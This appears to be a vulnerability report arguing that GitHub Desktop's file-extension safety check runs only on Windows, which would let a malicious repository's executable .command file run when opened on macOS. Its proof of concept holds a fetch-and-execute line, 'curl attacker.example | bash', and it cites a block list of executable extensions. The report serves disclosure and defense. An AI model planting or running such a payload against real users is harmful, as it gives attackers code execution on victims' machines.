Based on the codebase evidence, I found a strong analog to the "missing modifier" bug class in GitHub Desktop's file-extension safety check, which is a platform-scoped guard rather than a universal one.

### Title
Missing cross-platform enforcement of `isSafeFileExtension` allows a malicious repository to trigger native code execution via "Open with Default Program" - (File: `app/src/ui/lib/context-menu.ts`)

### Summary
GitHub Desktop gates the "Open with Default Program" context-menu action behind an `isSafeFileExtension` check intended to stop the user from launching dangerous executables directly from a working directory that an attacker (via a cloned/fetched repository) fully controls. That guard, however, is only actually enforced on Windows; on macOS and Linux the function unconditionally returns `true` for every extension, so the "modifier" that is supposed to block dangerous file types is effectively missing on two of the three supported platforms.

### Finding Description
`isSafeFileExtension` maintains a hard-coded block-list (`.cmd`, `.exe`, `.bat`, `.sh`) but only applies it when `__WIN32__` is true: [1](#0-0) 

This function is used as the sole gate for the "Open with Default Program" menu item across every surface that lets a user act on files from an untrusted, attacker-supplied repository: the Changes list, the commit/PR file viewers, and conflict resolution dialogs, e.g.: [2](#0-1) [3](#0-2) [4](#0-3) 

When the item is enabled, the actual open is performed with `shell.openExternal('file://' + fullPath)`, i.e., the OS's native "open with default handler" facility: [5](#0-4) 

Because `isSafeFileExtension` returns `true` for anything that isn't `.cmd/.exe/.bat/.sh` on Windows, a file such as `payload.command` (macOS) is treated as "safe" even though double-opening a `.command` file is a documented way to have `Terminal.app` execute an arbitrary shell script with no further prompt. Git preserves the Unix executable bit for tracked files, so a cloned/fetched repository can ship a tracked, executable `.command` (or similarly auto-executing file type on Linux desktop environments) file that Desktop's own UI will happily let the user "Open with Default Program," at which point the OS runs it exactly as if the user had double-clicked it in Finder/Explorer.

### Impact Explanation
This corrupts the invariant "clicking a file from an untrusted repository through Desktop's UI should never itself result in code execution." A single click on a UI element that Desktop presents as safe (the extension filter greys out unsafe items) leads to native process execution outside of git and outside the sandboxed renderer, running with the full privileges of the logged-in user — file write/read outside the repo, credential exfiltration, or further compromise are all reachable from that shell.

### Likelihood Explanation
The only user action required is opening/cloning an attacker-supplied repository (a normal Desktop workflow) and clicking "Open with Default Program" on a file that Desktop's own context menu marked as enabled/safe — no admin rights, no local access, and no separate social-engineering step beyond what an attacker would do to get any repository added to Desktop. The extension allow-list check exists specifically to prevent this and is silently absent on macOS/Linux, which are two of Desktop's three supported platforms.

### Recommendation
Make `RestrictedFileExtensions` (or an equivalent list covering `.command`, `.desktop`, and other platform-specific auto-executing types) apply on macOS and Linux as well, not just Windows, and consider checking the file's executable bit in addition to its extension before enabling "Open with Default Program."

### Proof of Concept
1. Attacker publishes a repository containing a tracked, executable file `run.command` with `#!/bin/bash\ncurl attacker.example | bash` as its content, and commits it with the executable bit set.
2. Victim clones/fetches this repository into GitHub Desktop on macOS.
3. Victim right-clicks the file in the Changes list (or Files Changed / History views) and selects "Open with Default Program," which is enabled because `isSafeFileExtension('.command')` returns `true` on non-Windows platforms per `app/src/ui/lib/context-menu.ts`.
4. `shell.openExternal('file://.../run.command')` is invoked, macOS launches Terminal.app, and the attacker's script executes immediately with the user's privileges.

import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}
